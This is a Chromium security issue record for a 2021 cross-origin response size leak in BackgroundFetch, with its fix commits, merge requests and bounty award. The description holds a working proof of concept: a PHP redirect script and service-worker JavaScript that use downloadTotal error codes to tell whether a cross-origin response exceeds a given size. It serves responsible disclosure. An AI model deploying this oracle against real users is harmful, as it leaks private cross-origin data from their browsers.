# Security: Cross-Origin Response Size Leak Via BackgroundFetch

| Field | Value |
|-------|-------|
| **Issue ID** | [40057097](https://issues.chromium.org/issues/40057097) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>BackgroundFetch |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | la...@gmail.com |
| **Assignee** | ra...@chromium.org |
| **Created** | 2021-08-30 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

I decided to look a bit more into BackgroundFetch and found an oracle that makes it possible to leak the response size of cross-origin requests. By specifying a size for `downloadTotal` and redirect from same-site to cross-origin, a response that is larger than `downloadTotal` results in a `download-total-exceeded` error, whereas a response that is smaller than or equal results in `fetch-error`.  

I also verified that this works after the fixes for <https://crbug.com/chromium/1239709>.

**VERSION**  

Chrome Version: Version 92.0.4515.159 (Official Build) Arch Linux (64-bit)

**REPRODUCTION CASE**  

I made a simple page to reproduce the issue here: <https://ripe-succinct-root.glitch.me/>  

Enter a URL, a size to test and click on `Test!` to see if the response size is greater or smaller than the specified size.

The files to reproduce this locally:

```
<?php  
header("Location: " . $_GET["url"]);  

```
```
// can be empty  

```
```
<script>  
  const downloadTotal = 30; // response size to test  
  const url = ""; // url to test response size  
  
  navigator.serviceWorker.ready.then(async (swReg) => {  
    const bgFetch = await swReg.backgroundFetch.fetch(  
      "test",  
      [new Request("/redirect.php?url=" + url, { credentials: "include" })],  
      { downloadTotal: downloadTotal }  
    );  
  
    bgFetch.addEventListener("progress", () => {  
      if (!bgFetch.failureReason) return;  
  
      // bgFetch is either fetch-error or download-total-exceeded  
      console.log(  
        `Response size is ${  
          bgFetch.failureReason === "fetch-error"  
            ? "smaller than or equal to"  
            : "greater than"  
        } ${downloadTotal}`  
      );  
    });  
  });  
  
  navigator.serviceWorker.register("sw.js");  
</script>  

```

Start a local php server: `php -S 127.0.0.1:8000`

**CREDIT INFORMATION**  

Maurice Dauer

## Timeline

### [Deleted User] (2021-08-30)

[Empty comment from Monorail migration]

### dr...@chromium.org (2021-08-31)

peter@ - can you take a look?

[Monorail components: Blink>BackgroundFetch]

### [Deleted User] (2021-08-31)

[Empty comment from Monorail migration]

### pe...@chromium.org (2021-08-31)

+Rayan to confirm if this is the issue that's just been fixed

### [Deleted User] (2021-08-31)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ra...@chromium.org (2021-09-01)

No this is a different issue. The right fix would be resolving crbug.com/884672, but for now the fix in https://chromium-review.googlesource.com/c/chromium/src/+/3135676 will have to do.

### gi...@appspot.gserviceaccount.com (2021-09-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/26be5702dab1d98e4d4b076a73d4688d20c043be

commit 26be5702dab1d98e4d4b076a73d4688d20c043be
Author: Rayan Kanso <rayankans@google.com>
Date: Fri Sep 03 15:20:43 2021

[BackgroundFetch] Use less-specific error codes for CORS-failing fetches

Bug: 1245053
Change-Id: If0343157a3ba41a6c946b5f7401a9d114f834779
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3135676
Commit-Queue: Rayan Kanso <rayankans@chromium.org>
Reviewed-by: Richard Knoll <knollr@chromium.org>
Cr-Commit-Position: refs/heads/main@{#918109}

[modify] https://crrev.com/26be5702dab1d98e4d4b076a73d4688d20c043be/content/browser/background_fetch/background_fetch_job_controller.cc
[modify] https://crrev.com/26be5702dab1d98e4d4b076a73d4688d20c043be/content/browser/background_fetch/background_fetch_job_controller.h
[modify] https://crrev.com/26be5702dab1d98e4d4b076a73d4688d20c043be/content/browser/background_fetch/background_fetch_job_controller_unittest.cc


### ra...@chromium.org (2021-09-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-04)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-04)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-04)

Requesting merge to beta M94 because latest trunk commit (918109) appears to be after beta branch point (911515).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-09-04)

This bug requires manual review: M94's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/main/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), harrysouders@(iOS), matthewjoseph@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ra...@chromium.org (2021-09-06)

1. Does your merge fit within the Merge Decision Guidelines?
Yes

2. Links to the CLs you are requesting to merge.
https://chromium-review.googlesource.com/c/chromium/src/+/3135676

3. Has the change landed and been verified on ToT?
Yes

4. Does this change need to be merged into other active release branches (M-1, M+1)?
No

5. Why are these changes required in this milestone after branch?
Security issue

6. Is this a new feature?
No

7. If it is a new feature, is it behind a flag using finch?
N/A


### sr...@google.com (2021-09-07)

Merge approved for M94 branch:4606 please merge before 3pm PST today so this can go out in tomorrow beta release

### gi...@appspot.gserviceaccount.com (2021-09-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/096afc1c5428d035b5166b7f279bdff7a5e2cbfa

commit 096afc1c5428d035b5166b7f279bdff7a5e2cbfa
Author: Rayan Kanso <rayankans@google.com>
Date: Tue Sep 07 20:14:30 2021

[BackgroundFetch] Use less-specific error codes for CORS-failing fetches

(cherry picked from commit 26be5702dab1d98e4d4b076a73d4688d20c043be)

Bug: 1245053
Change-Id: If0343157a3ba41a6c946b5f7401a9d114f834779
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3135676
Commit-Queue: Rayan Kanso <rayankans@chromium.org>
Reviewed-by: Richard Knoll <knollr@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#918109}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3143786
Commit-Queue: Richard Knoll <knollr@chromium.org>
Cr-Commit-Position: refs/branch-heads/4606@{#833}
Cr-Branched-From: 35b0d5a9dc8362adfd44e2614f0d5b7402ef63d0-refs/heads/master@{#911515}

[modify] https://crrev.com/096afc1c5428d035b5166b7f279bdff7a5e2cbfa/content/browser/background_fetch/background_fetch_job_controller.cc
[modify] https://crrev.com/096afc1c5428d035b5166b7f279bdff7a5e2cbfa/content/browser/background_fetch/background_fetch_job_controller.h
[modify] https://crrev.com/096afc1c5428d035b5166b7f279bdff7a5e2cbfa/content/browser/background_fetch/background_fetch_job_controller_unittest.cc


### am...@chromium.org (2021-09-20)

[Empty comment from Monorail migration]

### am...@google.com (2021-09-21)

[Empty comment from Monorail migration]

### vo...@google.com (2021-09-28)

[Empty comment from Monorail migration]

### gi...@google.com (2021-09-28)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-09-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/e8a5cefd1aac01a460129a800c88c3acc59a0a29

commit e8a5cefd1aac01a460129a800c88c3acc59a0a29
Author: Rayan Kanso <rayankans@google.com>
Date: Wed Sep 29 14:40:47 2021

[M90-LTS][BackgroundFetch] Use less-specific error codes for CORS-failing fetches

(cherry picked from commit 26be5702dab1d98e4d4b076a73d4688d20c043be)

Bug: 1245053
Change-Id: If0343157a3ba41a6c946b5f7401a9d114f834779
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3135676
Commit-Queue: Rayan Kanso <rayankans@chromium.org>
Reviewed-by: Richard Knoll <knollr@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#918109}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3190112
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Owners-Override: Victor-Gabriel Savu <vsavu@google.com>
Commit-Queue: Zakhar Voit <voit@google.com>
Cr-Commit-Position: refs/branch-heads/4430@{#1628}
Cr-Branched-From: e5ce7dc4f7518237b3d9bb93cccca35d25216cbe-refs/heads/master@{#857950}

[modify] https://crrev.com/e8a5cefd1aac01a460129a800c88c3acc59a0a29/content/browser/background_fetch/background_fetch_job_controller.cc
[modify] https://crrev.com/e8a5cefd1aac01a460129a800c88c3acc59a0a29/content/browser/background_fetch/background_fetch_job_controller.h
[modify] https://crrev.com/e8a5cefd1aac01a460129a800c88c3acc59a0a29/content/browser/background_fetch/background_fetch_job_controller_unittest.cc


### am...@google.com (2021-10-06)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-10-06)

Congratulations, Maurice! The VRP Panel has decided to award you $3,000 for this report. Thank you for discovering this issue was not fully resolved and taking the time to report it to us. 

### am...@google.com (2021-10-08)

[Empty comment from Monorail migration]

### am...@google.com (2021-10-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-10)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1245053?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057097)*
